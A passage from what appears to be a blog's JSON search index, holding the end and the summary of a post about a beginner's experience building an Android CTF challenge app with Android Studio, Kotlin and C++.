upload the whole project there. While I did not mention chatgpt, it actually helps a lot cause C++ is another nightmare. For those that want to try my challenge, I have uploaded the APK as well.\nReferences My Android Project My Android APK Useful YT video for developing the UI Android Documentation on adding C++ code ","permalink":"https://callmeks.github.io/posts/journey-of-creating-android-ctf/","summary":"\u003ch2 id=\"overview-about-the-journey\"\u003eOverview about the journey\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI have 0 knowledge about kotlin as well as creating Android APK. Most of the things that I mentioned below is also my first time.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"part-0\"\u003ePART 0\u003c/h2\u003e\n\u003cp\u003eHere\u0026rsquo;s the part where I started out by exploring how to create an Android APK. Basically just tons of youtube vidoes and blogs. The final decision? I just go with Android Studio. The installation is simple but remember to download system image for Virtual Device which is also a part of Android Studio.\u003c/p\u003e","title":"Journey of Creating Android CTF"}]